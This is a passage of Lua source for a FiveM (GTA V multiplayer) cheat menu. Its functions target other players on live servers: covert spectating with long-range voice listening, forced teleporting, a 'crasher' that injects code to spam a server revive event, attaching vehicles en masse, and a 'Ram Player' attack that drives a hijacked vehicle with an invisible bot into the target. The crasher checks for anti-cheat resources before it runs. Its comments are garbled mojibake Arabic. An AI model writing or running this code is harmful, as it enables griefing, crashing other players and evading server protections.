                    -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ Ù‡Ùˆ Ø§Ù„Ø³Ø§Ø¦Ù‚
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        
                        local velocity = GetEntityVelocity(vehicle)
                        local vehicleHeight = GetEntityHeightAboveGround(vehicle)
                        
                        -- Ø¬Ø§Ø°Ø¨ÙŠØ© Ø®ÙÙŠÙØ© Ø¬Ø¯Ø§Ù‹ ÙÙ‚Ø· Ù„Ùˆ ÙƒØ§Ù†Øª ÙÙŠ Ø§Ù„Ù‡ÙˆØ§Ø¡
                        if vehicleHeight > 1.0 then
                            local downwardForce = velocity.z - 2.0 -- Ø¬Ø°Ø¨ Ø®ÙÙŠÙ Ø¬Ø¯Ø§Ù‹
                            
                            -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¬Ø§Ø°Ø¨ÙŠØ© Ø§Ù„Ø®ÙÙŠÙØ©
                            SetEntityVelocity(vehicle, velocity.x, velocity.y, downwardForce)
                        end
                        
                    end
                end
                Citizen.Wait(100) -- ØªØ­Ø¯ÙŠØ« Ø£Ø¨Ø·Ø£
            end
        end)
    end,
    function()
        groundMagnetActive = false
        groundMagnetLoop = false
        MachoMenuNotification("Light Ground Magnet", "Deactivated")
    end
)




MachoMenuText(MenuWindow,"Players & Vehicles")
local MainTab = MachoMenuAddTab(MenuWindow, "Player list")
local sdSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
local sdSERVERCFWEachSectionWidth = (sdSERVERCFWSectionChildWidth - 20) / 2

local PlayerSection = MachoMenuGroup(MainTab, "Player Trolls", 
    TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
    MenuSize.x - 5, MenuSize.y - 5)

local InfoSection = MachoMenuGroup(MainTab, "Main & Info", 
    TabsBarWidth + 5, 5 + MachoPaneGap, 
    TabsBarWidth + sdSERVERCFWEachSectionWidth, MenuSize.y - 5)

local TextHandles = {}
for i = 1, 5 do
    TextHandles[i] = MachoMenuText(InfoSection, (i == 1 and "Name: ") or (i == 2 and "player ID: ") or (i == 3 and "Distance: ") or
        (i == 4 and "Driving: ") or (i == 5 and "Alive: ") .. "Waiting for a select")
end

local function generateRandomText(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local randomText = ""
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        randomText = randomText .. string.sub(chars, randIndex, randIndex)
    end
    return randomText
end

local function generateTransitionText(targetText, currentIndex)
    if currentIndex >= #targetText then
        return targetText
    end
    local partialText = string.sub(targetText, 1, currentIndex)
    local remainingLength = #targetText - currentIndex
    return partialText .. generateRandomText(remainingLength)
end

local function getPlayerInfo(player)
    if not player or not DoesEntityExist(GetPlayerPed(player)) then
        return nil
    end

    local ped = GetPlayerPed(player)
    local myPed = PlayerPedId()
    local info = {}

    info[1] = "Name: " .. (GetPlayerName(player) or "Unknown")
    info[2] = "Player ID: " .. (GetPlayerServerId(player) or "Unknown")

    local myCoords = GetEntityCoords(myPed)
    local playerCoords = GetEntityCoords(ped)
    local distance = #(myCoords - playerCoords)
    info[3] = string.format("Distance: %.0f m", distance)

    info[4] = "Driving: " .. (IsPedInAnyVehicle(ped, false) and "Yes" or "No")
    info[5] = "Alive: " .. (IsPedDeadOrDying(ped, true) and "No" or "Yes")

    return info
end

Citizen.CreateThread(function()
    local currentPlayer = nil
    local transitionIndices = {0, 0, 0, 0, 0}
    local isTransitioning = false
    local targetTexts = {"", "", "", "", ""}

    while true do
        local player = MachoMenuGetSelectedPlayer()

        if player and type(player) == "number" and NetworkIsPlayerActive(player) and DoesEntityExist(GetPlayerPed(player)) then
            if player ~= currentPlayer then
                currentPlayer = player
                local info = getPlayerInfo(player)
                if info then
                    for i = 1, 5 do
                        targetTexts[i] = info[i]
                        transitionIndices[i] = 0
                    end
                    isTransitioning = true
                end
            end

            if isTransitioning then
                local allDone = true
                for i = 1, 5 do
                    if transitionIndices[i] <= #targetTexts[i] then
                        MachoMenuSetText(TextHandles[i], generateTransitionText(targetTexts[i], transitionIndices[i]))
                        transitionIndices[i] = transitionIndices[i] + 1
                        allDone = false
                    end
                end
                if allDone then
                    isTransitioning = false
                    for i = 1, 5 do
                        MachoMenuSetText(TextHandles[i], targetTexts[i])
                    end
                end
                Citizen.Wait(25)
            else
                local info = getPlayerInfo(player)
                if info then
                    for i = 1, 5 do
                        MachoMenuSetText(TextHandles[i], info[i])
                    end
                end
                Citizen.Wait(25)
            end
        else
            currentPlayer = nil
            isTransitioning = false
            for i = 1, 5 do
                local prefix = (i == 1 and "Name: ") or (i == 2 and "Player ID: ") or (i == 3 and "Distance: ") or
                               (i == 4 and "Driving: ") or (i == 5 and "alive: ")
                MachoMenuSetText(TextHandles[i], prefix .. "Waiting for a select")
            end
            Citizen.Wait(25)
        end
    end
end)
local isSpectating = false
local spectateCamera = nil
local spectatingTarget = nil
local camRot = vector3(0.0, 0.0, 0.0)
local camDistance = 5.0

MachoMenuCheckbox(InfoSection, "Spectate Player",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 then
            return MachoMenuNotification("Error", "No player selected")
        end

        local targetPed = GetPlayerPed(selectedPlayer)
        if not DoesEntityExist(targetPed) then
            return MachoMenuNotification("Error", "Player not found")
        end

        isSpectating = true
        spectatingTarget = selectedPlayer
        SetPlayerControl(PlayerId(), false, 0)

        -- Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        spectateCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        SetCamActive(spectateCamera, true)
        RenderScriptCams(true, true, 0, true, true)

        Citizen.CreateThread(function()
            while isSpectating and DoesEntityExist(GetPlayerPed(spectatingTarget)) do
                local ped = GetPlayerPed(spectatingTarget)
                local targetCoords = GetEntityCoords(ped)

                -- Ù‚Ø±Ø§Ø¡Ø© Ø­Ø±ÙƒØ© Ø§Ù„Ù…Ø§ÙˆØ³
                local mouseX = GetDisabledControlNormal(0, 1)
                local mouseY = GetDisabledControlNormal(0, 2)

                camRot = vector3(
                    math.max(-89.0, math.min(89.0, camRot.x - mouseY * 5.0)),
                    0.0,
                    camRot.z - mouseX * 5.0
                )

                -- Ø­Ø³Ø§Ø¨ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                local direction = RotationToDirection(camRot)
                local camCoords = targetCoords - direction * camDistance + vector3(0.0, 0.0, 1.0)

                SetCamCoord(spectateCamera, camCoords.x, camCoords.y, camCoords.z)
                PointCamAtEntity(spectateCamera, ped, 0.0, 0.0, 0.0, true)
                SetCamRot(spectateCamera, camRot.x, camRot.y, camRot.z, 2)

                -- ØªØ¹Ø·ÙŠÙ„ Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„ÙƒØ§Ù…Ù„
                DisableAllControlActions(0)
                EnableControlAction(0, 1, true) -- Ù…Ø§ÙˆØ³ X
                EnableControlAction(0, 2, true) -- Ù…Ø§ÙˆØ³ Y

                Citizen.Wait(0)
            end
        end)

        NetworkSetTalkerProximity(9999.0) -- Ù†Ø³Ù…Ø¹ Ø§Ù„ØµÙˆØª Ù…Ù† Ø¨Ø¹ÙŠØ¯
        NetworkClearVoiceChannel()

        MachoMenuNotification("Spectate", "Spectating ID: " .. GetPlayerServerId(selectedPlayer))
    end,

    function()
        isSpectating = false
        spectatingTarget = nil
        SetPlayerControl(PlayerId(), true, 0)

        if spectateCamera then
            RenderScriptCams(false, false, 0, true, true)
            DestroyCam(spectateCamera, false)
            spectateCamera = nil
        end

        NetworkSetTalkerProximity(15.0)

        MachoMenuNotification("Spectate", "Stopped spectating")
    end
)
MachoMenuCheckbox(InfoSection, "Teleport Player to Me",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 then
            return MachoMenuNotification("Error", "No player selected")
        end

        local targetPed = GetPlayerPed(selectedPlayer)
        if not DoesEntityExist(targetPed) then
            return MachoMenuNotification("Error", "Player not found")
        end

        isAutoTeleporting = true
        teleportingTarget = selectedPlayer

        Citizen.CreateThread(function()
            while isAutoTeleporting and DoesEntityExist(GetPlayerPed(teleportingTarget)) do
                local targetPed = GetPlayerPed(teleportingTarget)
                local playerPed = PlayerPedId()
                
                if DoesEntityExist(targetPed) and DoesEntityExist(playerPed) then
                    local myCoords = GetEntityCoords(playerPed)

                    -- Ø·Ù„Ø¨ Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„ÙƒÙŠØ§Ù† Ù‚Ø¨Ù„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ù†Ù‚Ù„
                    local timeout = 0
                    while not NetworkHasControlOfEntity(targetPed) and timeout < 50 do
                        NetworkRequestControlOfEntity(targetPed)
                        Citizen.Wait(100)
                        timeout = timeout + 1
                    end

                    -- ÙÙ‚Ø· Ø­Ø§ÙˆÙ„ ØªÙ†Ù‚Ù„Ù‡ Ù„Ùˆ Ø­ØµÙ„Øª Ø§Ù„ØªØ­ÙƒÙ…
                    if NetworkHasControlOfEntity(targetPed) then
                        SetEntityCoords(targetPed, myCoords.x + 1.0, myCoords.y + 1.0, myCoords.z, false, false, false, true)
                    else
                        MachoMenuNotification("Error", "Couldn't get control of player")
                    end
                end

                Citizen.Wait(1000)
            end
        end)

        MachoMenuNotification("Auto Teleport", "Started auto teleporting ID: " .. GetPlayerServerId(selectedPlayer))
    end,

    function()
        isAutoTeleporting = false
        teleportingTarget = nil

        MachoMenuNotification("Auto Teleport", "Stopped auto teleporting")
    end
)


function RotationToDirection(rot)
    local radX = math.rad(rot.x)
    local radZ = math.rad(rot.z)
    return vector3(
        -math.sin(radZ) * math.abs(math.cos(radX)),
        math.cos(radZ) * math.abs(math.cos(radX)),
        math.sin(radX)
    )
end

MachoMenuButton(InfoSection, "Crash Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            -- More notifications to give a searching impression
            Citizen.Wait(500)
            MachoMenuNotification("Search", "Checking for Crasher...")
            Citizen.Wait(500)
            MachoMenuNotification("Search", "Analyzing...")
            Citizen.Wait(500)
            
            -- Main loading notification
            MachoMenuNotification("Loading", "loading Crasher...")

            local targetServerId = GetPlayerServerId(selectedPlayer)
            
            -- Wait for a moment to give the "loading" message some time to display
            Citizen.Wait(1000)

            -- Check if any of the specified resources exist
            local isProtectedServer = false
            if GetResourceState("EC_AC") == "started" then
                isProtectedServer = true
            end

            if not isProtectedServer and GetResourceState("vrp") == "started" then
                isProtectedServer = true
            end

            if not isProtectedServer then
                local allResources = GetNumResources()
                for i = 0, allResources - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if string.sub(resourceName, 1, 4) == "esx_" then
                        isProtectedServer = true
                        break
                    end
                end
            end

            if isProtectedServer then
                -- If any of the resources are found, show the "cannot revive" notification
                MachoMenuNotification("Error", "you can't use the Crasher in this server")
            else
                -- If none of the specified resources are found, proceed with the revive spam
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local targetServerId = ]] .. targetServerId .. [[
                        local count = 0
                        while count < 120 do
                            TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                            Citizen.Wait(1) -- Delay of 1 millisecond
                            count = count + 1
                        end
                    end)
                ]])
                MachoMenuNotification("Success", "Sent Crash to Player ID: " .. targetServerId)

            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(InfoSection, "Goto Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetCoords = GetEntityCoords(targetPed)
            local playerPed = PlayerPedId()
            SetEntityCoords(playerPed, targetCoords.x + 1.0, targetCoords.y + 1.0, targetCoords.z, false, false, false, true)
            MachoMenuNotification("Players", "Teleported to Player ID: " .. GetPlayerServerId(selectedPlayer))
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)



MachoMenuButton(InfoSection, "Copy Outfit", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    -- Clone the outfit
    local playerPed = PlayerPedId()
    
    -- Get all clothing components from target player
    for i = 0, 11 do
        local componentId = GetPedDrawableVariation(targetPed, i)
        local textureId = GetPedTextureVariation(targetPed, i)
        SetPedComponentVariation(playerPed, i, componentId, textureId, 0)
    end
    
    -- Get all props from target player
    for i = 0, 7 do
        local propId = GetPedPropIndex(targetPed, i)
        local propTexture = GetPedPropTextureIndex(targetPed, i)
        if propId ~= -1 then
            SetPedPropIndex(playerPed, i, propId, propTexture, true)
        else
            ClearPedProp(playerPed, i)
        end
    end
    
    local targetName = GetPlayerName(selectedPlayer)
    MachoMenuNotification("Clone Outfit", "Cloned outfit from " .. targetName)
end)


MachoMenuButton(InfoSection, "Into Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            if vehicle and vehicle ~= 0 then
                local playerPed = PlayerPedId()
                local freeSeat = -1
                for seat = 0, GetVehicleMaxNumberOfPassengers(vehicle) do
                    if IsVehicleSeatFree(vehicle, seat) then
                        freeSeat = seat
                        break
                    end
                end
                if freeSeat ~= -1 then
                    TaskWarpPedIntoVehicle(playerPed, vehicle, freeSeat)
                    MachoMenuNotification("Players", "Entered Player " .. GetPlayerServerId(selectedPlayer) .. "'s vehicle")
                else
                    MachoMenuNotification("Error", "No free seats in vehicle")
                end
            else
                MachoMenuNotification("Error", "Player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)

MachoMenuButton(InfoSection, "Ride Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    -- Check if already attached
    if IsEntityAttached(PlayerPedId()) then
        -- Stop piggyback
        ClearPedSecondaryTask(PlayerPedId())
        DetachEntity(PlayerPedId(), true, false)
        MachoMenuNotification("Piggyback", "Stopped piggyback ride")
    else
        -- Start piggyback
        local playerPed = GetPlayerPed(selectedPlayer)
        
        if not DoesEntityExist(playerPed) then
            MachoMenuNotification("Error", "Target player not found!")
            return
        end
        
        -- Load animation
        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                Citizen.Wait(0)
            end        
        end
        
        -- Attach to player with corrected positioning (rotated LEFT and lower)
        AttachEntityToEntity(PlayerPedId(), playerPed, 0, 0.0, -0.25, 0.45, 0.0, 0.0, 25.0, false, false, false, false, 2, false)
        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
        
        local targetName = GetPlayerName(selectedPlayer)
        MachoMenuNotification("Piggyback", "Piggyback riding on " .. targetName)
    end
end)
MachoMenuButton(InfoSection, "Attach Vehicles Spam it!", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if not selectedPlayer or selectedPlayer == -1 then
        MachoMenuNotification("Error", "No player selected")
        return
    end

    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)

    -- Injecting the client-side code into vrp resource
    MachoInjectResource("any", [[
        Citizen.CreateThread(function()
            local selectedPlayer = ]] .. selectedPlayer .. [[
            local targetPed = GetPlayerPed(selectedPlayer)
            
            -- Exit if the target ped does not exist
            if not DoesEntityExist(targetPed) then 
                return 
            end

            local playerPed = PlayerPedId()
            local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
            local originalHeading = ]] .. originalHeading .. [[
            
            local vehicles = GetGamePool("CVehicle")
            local attachedVehicles = {}
            local failedToAttach = {}
            local targetCoords = GetEntityCoords(targetPed)
            local maxAttachDistance = 1000.0 -- Define a maximum distance for attaching vehicles. Adjust as needed.


            -- Loop through all vehicles in the game pool
            for _, vehicle in pairs(vehicles) do
                -- Check if the vehicle entity exists and is within the defined distance
                if DoesEntityExist(vehicle) and Vdist(GetEntityCoords(vehicle), targetCoords) < maxAttachDistance then
                    local netID = NetworkGetNetworkIdFromEntity(vehicle)
                    local attempts = 0
                    local maxAttempts = 60 -- Increased attempts for network control
                    local waitTime = 5   -- Increased wait time per attempt (in milliseconds)

                    -- Attempt to gain network control of the vehicle
                    while not NetworkHasControlOfEntity(vehicle) and attempts < maxAttempts do
                        NetworkRequestControlOfEntity(vehicle)
                        Citizen.Wait(waitTime) -- Wait for a short period to allow network control to be granted
                        attempts = attempts + 1
                    end

                    -- If network control is successfully gained
                    if NetworkHasControlOfEntity(vehicle) then
                        SetNetworkIdCanMigrate(netID, true) -- Allow network migration
                        SetEntityAsMissionEntity(vehicle, true, true) -- Mark as mission entity to prevent despawn
                        SetVehicleHasBeenOwnedByPlayer(vehicle, true) -- Mark as owned by player

                        -- Attach the vehicle to the target ped
                        -- Parameters: entityToAttach, entityToAttachTo, boneIndex, xOffset, yOffset, zOffset, xRot, yRot, zRot, 
                        --             p_9, useZaxis, p_11, p_12, collision, isPed, vertexIndex, fixedRot
                        AttachEntityToEntity(
                            vehicle, targetPed, 0,
                            0.0, 0.0, 2.0 + (#attachedVehicles * 1.0), -- Stack vehicles vertically
                            0.0, 0.0, 0.0,
                            false, false, true, false, 2, true
                        )
                        table.insert(attachedVehicles, vehicle)
                    else
                        -- Log vehicles that failed to gain control and thus couldn't be attached
                        table.insert(failedToAttach, GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)))
                    end
                end
            end

            -- Display notification for failed attachments
            if #failedToAttach > 0 then
                local failedMsg = "Failed to attach " .. #failedToAttach .. " vehicles: " .. table.concat(failedToAttach, ", ") .. "."
                -- MachoMenuNotification("Warning", failedMsg) -- Uncomment if MachoMenuNotification is available in client-side context
            end

            -- Speed up player movement
            SetPedMoveRateOverride(playerPed, 10.0)

            -- Clear any existing tasks on the player ped before starting the sequence
            ClearPedTasksImmediately(playerPed)

            -- Rapidly enter and exit attached vehicles
            for i, vehicle in ipairs(attachedVehicles) do
                -- Ensure vehicle still exists before interacting
                if not DoesEntityExist(vehicle) then
                    goto continue_loop -- Skip to next iteration
                end

                ClearPedTasksImmediately(playerPed) -- Clear tasks before each new action

                -- Check if the driver's seat is free (-1 indicates driver's seat)
                if IsVehicleSeatFree(vehicle, -1) then
                    -- If the seat is empty, warp the ped directly into the vehicle
                    Citizen.Wait(100) -- Small delay after warping
                else
                    -- If the seat is occupied, use TaskEnterVehicle
                    TaskEnterVehicle(playerPed, vehicle, 1, -1, 100.0, 1, 0) -- Enter as driver, high speed, any seat

                    local taskEnterTimeout = GetGameTimer() + 3000 -- Increased timeout to 3 seconds for TaskEnterVehicle
                    while not IsPedInVehicle(playerPed, vehicle, false) and GetGameTimer() < taskEnterTimeout do
                        Citizen.Wait(10)
                    end

                    -- Fallback: If TaskEnterVehicle failed to complete within the timeout, force warp
                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        ClearPedTasksImmediately(playerPed) -- Clear tasks before fallback warp
                        Citizen.Wait(100) -- Small delay after fallback warp
                    end
                end
                
                -- Check if ped is actually in the vehicle before trying to leave
                if IsPedInVehicle(playerPed, vehicle, false) then
                    Citizen.Wait(100) -- Small delay after entering (or warping)
                    ClearPedTasksImmediately(playerPed) -- Clear tasks before leaving
                    TaskLeaveVehicle(playerPed, vehicle, 0) -- Exit vehicle
                    
                    local leaveTimeout = GetGameTimer() + 900 -- 0.9 seconds timeout for leaving
                    while IsPedInVehicle(playerPed, vehicle, false) and GetGameTimer() < leaveTimeout do
                        Citizen.Wait(10)
                    end
                    Citizen.Wait(100) -- Small delay after exiting
                else
                end

                ClearPedTasksImmediately(playerPed)
                -- Reset player position and heading
                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                SetEntityHeading(playerPed, originalHeading)
                
                Citizen.Wait(60) -- Quick transition before the next vehicle
                ::continue_loop:: -- Label for goto statement
            end

            -- Reset player movement speed to normal
            SetPedMoveRateOverride(playerPed, 1.0)
        end)
    ]])
    
    -- Notification for the user
    MachoMenuNotification("Injected", "Fast Enter injected for all nearby vehicles. Check console for details.")
end)

MachoMenuButton(PlayerSection, "Ram Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)
    
    -- Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø®ØªØ§Ø± ÙÙŠ Ø³ÙŠØ§Ø±Ø©
    if targetVehicle ~= 0 then
        -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© Ù…Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠÙŠÙ†
        local isVehicleEmpty = true
        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
        
        for seat = -1, maxSeats do
            local pedInSeat = GetPedInVehicleSeat(targetVehicle, seat)
            if pedInSeat ~= 0 then
                local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                if playerId ~= -1 and IsPlayerActive(playerId) then
                    isVehicleEmpty = false
                    break
                end
            end
        end
        
        if isVehicleEmpty then
            -- Fast warp for empty vehicle
            SetEntityVisible(playerPed, false, false)
            ClearPedTasksImmediately(playerPed)
            TaskWarpPedIntoVehicle(playerPed, targetVehicle, -1)
            ClearPedTasksImmediately(playerPed)
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
            SetEntityHeading(playerPed, originalHeading)
            SetEntityVisible(playerPed, true, false)
            
            -- Single VDM attack using MachoInjectResource
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                    local targetVehicle = ]] .. targetVehicle .. [[
                    
                    if DoesEntityExist(targetPed) and DoesEntityExist(targetVehicle) then
                        local targetPos = GetEntityCoords(targetPed)
                        local targetHeading = GetEntityHeading(targetPed)
                        local forwardVec = GetEntityForwardVector(targetPed)
                        local spawnPos = targetPos + forwardVec * 15.0
                        
                        NetworkRequestControlOfEntity(targetVehicle)
                        SetEntityAsMissionEntity(targetVehicle, true, true)
                        
                        -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                        local botModel = GetHashKey("mp_m_freemode_01")
                        RequestModel(botModel)
                        while not HasModelLoaded(botModel) do
                            Citizen.Wait(0)
                        end
                        
                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                        
                        SetEntityAsMissionEntity(botPed, false, false)
                        SetPedCanBeDraggedOut(botPed, false)
                        SetPedConfigFlag(botPed, 32, true)
                        SetPedFleeAttributes(botPed, 0, false)
                        SetPedCombatAttributes(botPed, 17, true)
                        SetPedSeeingRange(botPed, 0.0)
                        SetPedHearingRange(botPed, 0.0)
                        SetPedAlertness(botPed, 0)
                        SetPedKeepTask(botPed, true)
                        SetEntityCollision(botPed, false, false)
                        SetEntityVisible(botPed, true, false)
                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                        
                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                        
                        SetVehicleDoorsLocked(targetVehicle, 4)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetVehicleEnginePowerMultiplier(targetVehicle, 2.0)
                        ModifyVehicleTopSpeed(targetVehicle, 1.5)
                        
                        -- Position vehicle and attack ONCE
                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                        PlaceObjectOnGroundProperly(targetVehicle)
                        
                        SetVehicleForwardSpeed(targetVehicle, 35.0)
                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 40.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                        
                        -- Clean up after 5 seconds
                        Citizen.Wait(5000)
                        if DoesEntityExist(botPed) then
                            DeleteEntity(botPed)
                        end
                        SetModelAsNoLongerNeeded(botModel)
                    end
                end)
            ]])
            
            local targetName = GetPlayerName(selectedPlayer)
            MachoMenuNotification("VDM", "Single attack launched on " .. targetName)
            
        else
            MachoMenuNotification("Error", "Target vehicle is occupied by other players!")
        end
        
    -- Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø®ØªØ§Ø± Ù„ÙŠØ³ ÙÙŠ Ø³ÙŠØ§Ø±Ø© - Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
    else
        local targetPos = GetEntityCoords(targetPed)
        
        -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£Ù‚Ø±Ø¨ Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
        local closestEmptyVehicle = nil
        local closestDistance = 999999.0
        
        for vehicle in EnumerateVehicles() do
            if DoesEntityExist(vehicle) then
                local vehiclePos = GetEntityCoords(vehicle)
                local distance = #(targetPos - vehiclePos)
                
                if distance < 100.0 then
                    local isVehicleEmpty = true
                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                    
                    for seat = -1, maxSeats do
                        local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                        if pedInSeat ~= 0 then
                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                            if playerId ~= -1 and IsPlayerActive(playerId) then
                                isVehicleEmpty = false
                                break
                            end
                        end
                    end
                    
                    if isVehicleEmpty and distance < closestDistance then
                        closestEmptyVehicle = vehicle
                        closestDistance = distance
                    end
                end
            end
        end
        
        if closestEmptyVehicle then
            -- Fast warp for empty vehicle
            SetEntityVisible(playerPed, false, false)
            ClearPedTasksImmediately(playerPed)
            TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
            ClearPedTasksImmediately(playerPed)
            TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
            SetEntityHeading(playerPed, originalHeading)
            SetEntityVisible(playerPed, true, false)
            
            -- Single VDM attack using MachoInjectResource
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                    local targetVehicle = ]] .. closestEmptyVehicle .. [[
                    
                    if DoesEntityExist(targetPed) and DoesEntityExist(targetVehicle) then
                        local targetPos = GetEntityCoords(targetPed)
                        local targetHeading = GetEntityHeading(targetPed)
                        local forwardVec = GetEntityForwardVector(targetPed)
                        local spawnPos = targetPos + forwardVec * 15.0
                        
                        NetworkRequestControlOfEntity(targetVehicle)
                        SetEntityAsMissionEntity(targetVehicle, true, true)
                        
                        -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                        local botModel = GetHashKey("mp_m_freemode_01")
                        RequestModel(botModel)
                        while not HasModelLoaded(botModel) do
                            Citizen.Wait(0)
                        end
                        
                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                        
                        SetEntityAsMissionEntity(botPed, false, false)
                        SetPedCanBeDraggedOut(botPed, false)
                        SetPedConfigFlag(botPed, 32, true)
                        SetPedFleeAttributes(botPed, 0, false)
                        SetPedCombatAttributes(botPed, 17, true)
                        SetPedSeeingRange(botPed, 0.0)
                        SetPedHearingRange(botPed, 0.0)
                        SetPedAlertness(botPed, 0)
                        SetPedKeepTask(botPed, true)
                        SetEntityCollision(botPed, false, false)
                        SetEntityVisible(botPed, true, false)
                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                        
                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                        
                        SetVehicleDoorsLocked(targetVehicle, 4)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
